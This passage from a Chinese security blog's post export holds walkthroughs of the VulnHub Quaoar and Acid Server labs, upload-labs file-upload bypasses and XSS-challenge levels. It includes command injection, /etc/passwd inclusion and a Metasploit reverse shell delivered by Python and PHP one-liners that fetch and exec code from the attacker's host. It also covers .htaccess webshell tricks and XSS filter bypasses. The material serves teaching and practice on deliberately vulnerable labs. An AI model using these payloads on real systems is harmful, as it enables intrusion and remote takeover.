&gt;/tmp/f 攻击端 1nc -lp 8126 查找敏感信息查看目录信息 查看wordpress配置信息 获得数据库用户名和密码 12user:rootpassword:rootpassword! 查看端口开放情况 数据库是mysql数据库 反弹的Shell无法登录mysql，输入密码之后，就卡住不动了 尝试用数据库密码ssh连接靶机 在root目录下，获得第一个flag 查找flag 在wpadmin用户目录下获得第二个flag.txt 在登录界面提示上有一个后渗透的flag，还有一个flag 登录mysql，查看mysql.user 这篇WalkThrough CTF WALKTHROUGH – HACKFEST2016: QUAOAR (VULNHUB)，找到了第三个flag，在/etc/cron.d/php5文件里 4. 总结1.查看robots.txt2.多收集工具，这个靶场可以用WPForce直接上传WebShell3.密码习惯，很多人都会使用同一个密码，这个靶场Linux的root密码和数据库的root密码是一样的4.熟悉各个CMS后台写入webshell的方法5.使用菜刀的虚拟终端用python或php反弹shell有时会失败6.cron是Linux的计划任务 5. 参考[1] CTF WALKTHROUGH – HACKFEST2016: QUAOAR (VULNHUB)","categories":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/categories/VulnHub/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/tags/VulnHub/"}]},{"title":"'VulnHub Acid Server Walkthrough'","slug":"VulnHub-Acid-Server","date":"2019-05-13T14:09:09.000Z","updated":"2019-07-04T11:25:17.013Z","comments":true,"path":"2019/05/13/VulnHub-Acid-Server/","link":"","permalink":"https://chirec.github.io/2019/05/13/VulnHub-Acid-Server/","excerpt":"1. 查看IP地址由于不知道靶场的登录密码，所以需要使用其他工具获取IP 这里使用Kali自带的一个工具netdiscover","text":"1. 查看IP地址由于不知道靶场的登录密码，所以需要使用其他工具获取IP 这里使用Kali自带的一个工具netdiscover 123456789101112131415161718Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c] -i device: your network device -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8 -l file: scan the list of ranges contained into the given file -p passive mode: do not send anything, only sniff -m file: scan the list of known MACs and host names -F filter: Customize pcap filter expression (default: &quot;arp&quot;) -s time: time to sleep between each arp request (milliseconds) -n node: last ip octet used for scanning (from 2 to 253) -c count: number of times to send each arp reques (for nets with packet loss) -f enable fastmode scan, saves a lot of time, recommended for auto -d ignore home config files for autoscan and fast mode -S enable sleep time supression between each request (hardcore mode) -P print results in a format suitable for parsing by another program -N Do not print header. Only valid when -P is enabled. -L in parsable output mode (-P), continue listening after the active scan is completedIf -r, -l or -p are not enabled, netdiscover will scan for common lan addresses. 执行 1netdiscover -r 192.168.126.0/24 查询VMware的Nat模式下的子网 找到了靶机的IP192.168.126.161 2. 扫描靶机端口使用Nmap扫描靶机端口 1nmap -sS -T4 -sV -O -p- 192.168.126.161 扫描结果 扫描发现靶机开放端口为33447 访问http://192.168.126.161:33447 3. Web网页的标题是/Challenge看起来是目录先把地址丢到DirBuster里去跑 查看网页源代码，在末尾发现十六进制字符串&lt;!--0x643239334c6d70775a773d3d--&gt;，解码后发现是base64编码格式d293LmpwZw==，再经过base64解码发现是一个图片wow.jpg，尝试在主页访问图片，并没有这个图片 这时，查看DirBuster 发现标题确实是目录名访问/Challenge，需要用邮箱和密码登录继续访问扫描出来的目录，发现cake.php页面的标题也是目录名/Magic_Box将目录改为/Challenge/Magic_Box，继续进行目录扫描 在扫描结果里看到了/images目录，将wow.jpg放在里面打开 使用WinHex打开图片，在末尾发现;37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34使用BurpSuite自带的Ascii Hex进行解码得到7aee0f6d588ed9905ee37f16a7c610d4，看起来像MD5加密后的字符串将字符串丢到MD5解密 获得63425可能是密码，不过图片这条线就到这里结束了 再回去看DirBuster扫描结果 访问/Challenge/Magic_Box/command.php 是一个可以执行ping命令的页面，输入Kali的IP地址测试一下 发现页面没有发生变化，查看页面源代码后发现结果在上方空白处 尝试命令执行注入 1192.168.126.126;ls 存在命令执行注入，可以反弹Shell进一步渗透 3.1 另一种思路对于cake.php页面还有另一种获取方法，From:CTF WALKTHROUGH – ACID: SERVER (VULNHUB) 在/Challenge/index.php页面的源代码中，可以发现&lt;!DOCTYPE gkg.qvpn html&gt; 使用ROT13解密得到txt.dica，反过来是acid.txt，访问/Challenge/acid.txt 又获得一个页面protected_page.php，打开之后发现没有权限访问 再回到/Challenge/index.php页面的源代码中，可以找到js/forms.js打开发现在文件中有版权信息 使用Google搜索peredur.net form_js 第一条就是该项目在GitHub上的仓库 进去之后，发现这是一个已经很久没有更新的项目，并且在Readme里写了作者没有时间更新，希望有人接手的信息，这些信息对我们没有什么用。在commits里查看Readme的更新 在Modified the README.md file中可以看到初始用户名和密码 123Username : test_user Email : test@example.com Password : 6ZaxN2Vzm9NUJT2y 使用这组密码登录Challenge/index.php，成功登录 就是之前发现的protected_page.php页面提示点击这里继续深入 点击之后，发现跳转到了/Challenge/include.php页面，页面自带本地包含功能，输入/etc/passwd，页面没有变化，查看源代码可以发现包含成功 可以看到acid和saman的用户ID 在源代码的最下面依然存在这一行被注释掉的十六进制字符串&lt;!--0x5933566a4c6e4a34626e413d--&gt; 按照之前的解密方式，解密获得cuc.rxnp，再经过ROT13解密获得php.ekac，反过来是cake.php，后续操作和第一种方法一样 4. 渗透Challenge/Magic_Box/command.php页面的标题是Reverse Kunfu，提示反弹Shell 使用MSF反弹Shell 12345678910msf5 &gt; use exploit/multi/script/web_deliverymsf5 exploit(multi/script/web_delivery) &gt; set lhost 192.168.126.126lhost =&gt; 192.168.126.126msf5 exploit(multi/script/web_delivery) &gt; set lport 8126lport =&gt; 8126msf5 exploit(multi/script/web_delivery) &gt; set srvport 7777srvport =&gt; 7777msf5 exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcppayload =&gt; python/meterpreter/reverse_tcpmsf5 exploit(multi/script/web_delivery) &gt; run PHP 1php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&apos;http://192.168.126.126:2626/qNRqp3NMPx&apos;));&quot; python 1python -c &quot;import sys;u=__import__(&apos;urllib&apos;+&#123;2:&apos;&apos;,3:&apos;.request&apos;&#125;[sys.version_info[0]],fromlist=(&apos;urlopen&apos;,));r=u.urlopen(&apos;http://192.168.126.126:7777/aSEchhTZ&apos;);exec(r.read());&quot; 在Challenge/Magic_Box/command.php页面输入 1;python -c &quot;import sys;u=__import__(&apos;urllib&apos;+&#123;2:&apos;&apos;,3:&apos;.request&apos;&#125;[sys.version_info[0]],fromlist=(&apos;urlopen&apos;,));r=u.urlopen(&apos;http://192.168.126.126:7777/aSEchhTZ&apos;);exec(r.read());&quot; Kali中MSF获得Shell 查看id 接下来查找敏感信息，看能否提升权限 在根目录下发现一个s.bin目录，里面有一个investigate.php的文件，查看其内容 123&lt;?phpecho &quot;Now you have to behave like an investigator to catch the culprit\\n&quot;;?&gt; 查看root,acid,saman的家目录 在acid的家目录加看到一个名为.sudo_as_admin_successful大小为0的文件，提示普通用户可以切换为root用户 查找acid这个用户的文件来获取他的密码来切换账户 1find / -user acid 2&gt;/dev/null 第一个是hint.pcapng文件，是一个流量包使用python搭建Server下载下来进行流量分析 1python -m SimpleHTTPServer 12600 使用WireShark打开，是一个由6400条记录的流量包 分析TCP协议，可以发现一段明文传输的对话 12345678heya helloWhat was the name of the Culprit??? saman and nowadays he&apos;s known by the alias of 1337hax0roh Fuck Great Now, we gonna Catch Him Soon :D Yes We have to !! The mad bomber is on a rageOhkcya Over and Out 找到了saman用户，以及他的别名1337hax0r，猜测这可能是他的密码 尝试切换rootsudo su 查找资料发现是ssh连接的原因，使用Kali切换 查看Flag 5. 总结1.netdiscover使用2.多看页面源码，注意源码长度3.查找用户文件find / -user 2&gt;/dev/null4.MSF反弹Shell模块exploit/multi/script/web_delivery5.尝试查找初始用户和初始密码 6. 参考[1] Acid: Server [2] CTF WALKTHROUGH – ACID: SERVER (VULNHUB) [2] 2018-09-14-Vulnhub渗透测试实战writeup(1) [3] Vulnhub Acid","categories":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/categories/VulnHub/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"https://chirec.github.io/tags/VulnHub/"}]},{"title":"'Upload Labs'","slug":"Upload-Labs","date":"2019-05-13T00:30:33.000Z","updated":"2019-05-17T11:36:44.945Z","comments":true,"path":"2019/05/13/Upload-Labs/","link":"","permalink":"https://chirec.github.io/2019/05/13/Upload-Labs/","excerpt":"推荐使用作者给的环境：下载地址有些漏洞对环境要求比较高 Pass-01上传PHP后缀的文件，发现没有经过BurpSuite就弹出警告，这种情况是前端JavaScript检测造成的。","text":"推荐使用作者给的环境：下载地址有些漏洞对环境要求比较高 Pass-01上传PHP后缀的文件，发现没有经过BurpSuite就弹出警告，这种情况是前端JavaScript检测造成的。 修改文件名后缀，改为gif再上传，绕过JavaScript验证，在BurpSuite里修改数据包，将文件名改为php 上传成功 除了使用BurpSuite抓包修改后缀名绕过JavaScript前端验证，还可以直接修改JavaScript代码，在白名单中添加php或直接破坏JavaScript，使其无法进行验证。 添加白名单 破坏JavaScript form表单 12345&lt;form enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\"&gt; &lt;p&gt;请选择要上传的图片：&lt;p&gt; &lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt; &lt;input class=\"button\" type=\"submit\" name=\"submit\" value=\"上传\"/&gt;&lt;/form&gt; JavaScript验证 12345678910111213141516171819&lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; from表单的onsubmit调用了checkFile()在checkFile()里，规定了允许上传的文件类型 Pass-02修改数据包中的Content-type 成功上传 1234567891011121314151617if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#123; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &apos;上传出错！&apos;; &#125; &#125; else &#123; $msg = &apos;文件类型不正确，请重新上传！&apos;; &#125; &#125; else &#123; $msg = UPLOAD_PATH.&apos;文件夹不存在,请手工创建！&apos;; &#125;&#125; 查看代码，使用数据包中的文件类型来判断文件类型，所以可以在BP里修改Content-type来绕过判断 Pass-03查看代码 12345678910111213141516171819202122232425if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &apos;上传出错！&apos;; &#125; &#125; else &#123; $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; &#125;&#125; 查看代码，发现会提取上传文件后缀名，并拿去和黑名单比对，然后再随机生成文件名保存，有strtolower()函数，所以无法大小写绕过 由于是黑名单，所以使用php3后缀绕过检测，而且可以被解析，同样可以绕过的后缀名还有phtml 上传phpinfo.php3 查看上传路径 访问上传文件 Pass-0412345678910111213141516171819202122if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123; $img_path = UPLOAD_PATH . $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $is_upload = true; &#125; &#125; else &#123; $msg = &apos;此文件不允许上传!&apos;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; &#125;&#125; 查看源码，黑名单里有一堆后缀，不过没有.htaccess，而且没有重命名上传文件所以可以先上传.htaccess，再上传图片马解析 123&lt;FilesMatch &quot;Pass-04.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上传图片马 上传地址 访问图片马 Pass-05123456789101112131415161718192021if (isset($_POST[&apos;submit&apos;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123; $img_path = UPLOAD_PATH . &apos;/&apos; . $file_name; $is_upload = true; &#125; &#125; else &#123; $msg = &apos;此文件不允许上传&apos;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; &#125;&#125; 查看源码，发现增加了.htacess后缀，不过这次少了strtolower()函数，所以可以大小写绕过","categories":[],"tags":[]},{"title":"'XSS-Challenge'","slug":"XSS-Challenge","date":"2019-05-13T00:29:35.000Z","updated":"2019-05-16T01:10:03.820Z","comments":true,"path":"2019/05/13/XSS-Challenge/","link":"","permalink":"https://chirec.github.io/2019/05/13/XSS-Challenge/","excerpt":"Level 1通过GET方式传入name，会在页面上显示出来 写入payload","text":"Level 1通过GET方式传入name，会在页面上显示出来 写入payload 12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt; 在代码中没有看到过滤、转义，直接将输入显示在页面上 Level 2通过GET方式传入keyword，会在页面上显示出来 并且在&lt;form&gt;标签的value属性上也会显示输入 尝试写入payload，发现没有正确的显示出来 使用Firebug查看，发现&lt;h2&gt;标签中的输入被HTML实体化编码 &lt;form&gt;标签中value属性的值同样被HTML实体化，不过由于在标签内部，所以可以使用事件触发xss，而不需要加上会被转义的&lt;&gt; payload 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str.&apos;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，可以看到htmlspecialchars()对输入进行了转义 Level 3通过GET方式传入keyword，显示方式和Level 2相同，在&lt;h2&gt;和&lt;form&gt;标签上显示 输入Level 2的payload，发现没有成功闭合 使用&#39;代替&quot;，成功闭合 payload 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; 代码上和第二关不同的地方在于，value=属性后引号变成了单引号，所以需要使用&#39;进行闭合。由于浏览器会将&#39;变为&quot;显示，所以使用Firebug审查元素时，无法区分 Level 4通过GET方式传入keyword，显示方式和Level 2略有不同，在&lt;h2&gt;标签上显示和输入的是相同的，不过依然被HTML实体化，而在&lt;form&gt;标签上显示的没有&lt;&gt; 使用Level 2的payload 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 可以看到str3是被过滤掉&lt;&gt;的，不过由于使用的on事件，而且本身在标签内部，所以不需要使用&lt;&gt; Level 5测试显示效果 使用Level 2的payload on事件被过滤为o_n O_o 使用javascript:alert(/xss/)绕过 payload 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现不仅过滤了on，还过滤了&lt;script，不过str3没有进行HTML实体化转义 Level 6测试显示效果 两个输出点的&lt;&gt;都被HTML实体编码 测试on事件 使用&quot;闭合，on被过滤为o_n 测试javascript:alert() 这里href也被过滤了，变成了hr_ef。有个奇怪的地方，刚才测试显示效果时&lt;&gt;被转义掉，但这次并没有被转义掉 被过滤掉的还有src、script 然后发现大小写可以绕过，明明前面都不能绕过的 payload 123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码发现&lt;script、on、src、data、href都被过滤，但是并没有strtolower()函数过滤大小写 Level 7测试显示效果这次使用带&lt;Chessur&gt;测试显示效果，发现变成小写了 测试on事件发现下面的on被过滤为空 尝试双写绕过 123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，这一关又有大小写过滤了….将关键词替换为空，所以双写直接绕过 Level 8看起来像DOM型XSS 测试显示效果这次有2个输出点，一个是&lt;form&gt;标签里，一个是在&lt;a&gt;标签里 查看过滤情况发现on、script、src都被过滤掉了，而且大小写无法绕过 由于输出点在href属性中，所以使用&lt;a href=javascript:alert()&lt;/a&gt;使用&amp;#x0A;来绕过过滤 payload 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，script、on、src、data、href、&quot;都被过滤掉了 Level 9测试显示效果使用了新的测试payload 1&quot;;!–&apos;&lt;CheSSur&gt;=&amp;&#123;(OnonSrcsrcscriptScRIPt)&#125; 大小写转为小写，没有过滤，有HTML实体编码转义在href标签处会判断链接是否合法判断链接是否合法的规则是输入中是否有http:// 使用Level 8的payload加上//http:// 1234567891011121314151617181920212223242526&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt;&lt;?phpif(false===strpos($str7,&apos;http://&apos;))&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;; &#125;else&#123; echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;&#125;?&gt; 查看代码发现和Level 8基本相同，在下面添加了判断URL是否合法的规则，不过由于使用的是strpos()函数，只判断字符串中是否出现过字符，而没有判断出现位置，所以可以添加到行尾，使用注释符注释掉进行绕过 Level 10测试显示效果进行了HTML实体化编码转义，对on、src、script进行了过滤 但是在&lt;h2标签下面有隐藏的&lt;form&gt;标签，测试发现只有t_sort可以被更改type显示出来 payload 1234567891011121314&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码，发现t_sort接收从页面传来的值，过滤掉了&lt;&gt;，使用on事件绕过 Level 11测试显示效果 和Level 10类似，都有隐藏的&lt;form标签 从Level 10跳转来会看到Referer，直接打开并没有 使用FireFox浏览器无法修改为Payload，用BurpSuite抓包修改Referer Forward 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_REFERER&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码 $str11获取Referer，过滤掉了&lt;&gt;，再输出到t_ref Level 12直接用Firebug审查元素 看到了&lt;input name=&quot;t_ua&quot; value=&quot;Mozilla/5.0 (Windows NT 